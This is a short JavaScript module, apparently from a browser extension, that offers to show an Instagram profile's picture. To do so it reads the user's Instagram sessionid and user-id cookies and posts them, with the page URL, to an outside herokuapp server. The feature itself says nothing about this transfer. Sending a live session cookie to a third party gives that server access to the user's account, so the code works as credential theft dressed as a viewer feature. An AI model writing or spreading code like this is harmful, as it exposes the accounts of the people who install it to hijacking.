import {
  get_cookies,
  get_current_url,
  openPopupAndSendMessage,
} from "../libs/libs";

import axios from "axios";

const API_LINK = "https://s0cialstalker.herokuapp.com/instagram/";
const DOMAIN = "https://www.instagram.com/";

export const InstagramProfilePicture = async () => {
  // Prepare Cookies
  const sid = await get_cookies("sessionid", DOMAIN);
  const u_id = await get_cookies("ds_user_id", DOMAIN);
  // Get Profile Link
  const profile_link = await get_current_url();

  // Send Request to API
  const { data } = await axios.post(`${API_LINK}profile_picture`, {
    sid,
    u_id,
    link: profile_link,
  });
  // OPEN POPUP and Receive the Message
  openPopupAndSendMessage("instagram_profile_picture", { image: data.base,username:data.username });
};
